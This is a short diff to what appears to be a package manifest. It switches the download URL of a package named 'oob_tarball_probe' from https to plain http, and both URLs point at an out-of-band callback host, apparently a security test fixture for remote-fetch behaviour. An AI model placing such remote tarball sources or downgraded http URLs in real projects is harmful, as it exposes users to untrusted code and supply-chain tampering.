@@ -1,3 +1,3 @@
 packages:
-  - tarball: "https://tarball.db7t14d07i5e1ro136kgbw58mcjoreyqi.oast.fun/pkg.tar.gz"
+  - tarball: "http://plainhttp.db7t14d07i5e1ro136kgbw58mcjoreyqi.oast.fun/pkg.tar.gz"
     name: "oob_tarball_probe"
